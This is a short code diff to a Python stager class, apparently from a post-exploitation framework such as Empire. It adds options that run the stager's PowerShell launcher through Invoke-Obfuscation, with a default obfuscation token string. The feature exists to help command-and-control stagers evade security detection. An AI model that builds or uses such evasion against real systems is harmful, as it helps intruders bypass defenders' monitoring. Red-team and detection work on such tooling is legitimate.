@@ -35,6 +35,16 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'False'
             },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True.',
+                'Required'      :   False,
+                'Value'         :   'Token,All,1,home,Encoding,3,home,Launcher,STDIN++,12467'
+            },
             'Encrypt' : {
                 'Description'   :   'Switch. Encrypt the stager with the config staging key.',
                 'Required'      :   True,
@@ -73,6 +83,8 @@ class Stager:
         # extract all of our options
         listenerID = self.options['Listener']['Value']
         base64 = self.options['Base64']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
         encrypt = self.options['Encrypt']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -95,7 +107,11 @@ class Stager:
             if encrypt.lower() == "true":
                 encryptScript = True
 
-            code = self.mainMenu.stagers.generate_stager(host, key, encrypt=encryptScript, encode=encode)
+            obfuscateScript = False
+            if obfuscate.lower() == "true":
+                obfuscateScript = True
+
+            code = self.mainMenu.stagers.generate_stager(host, key, encrypt=encryptScript, encode=encode, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand)
 
             return code
 
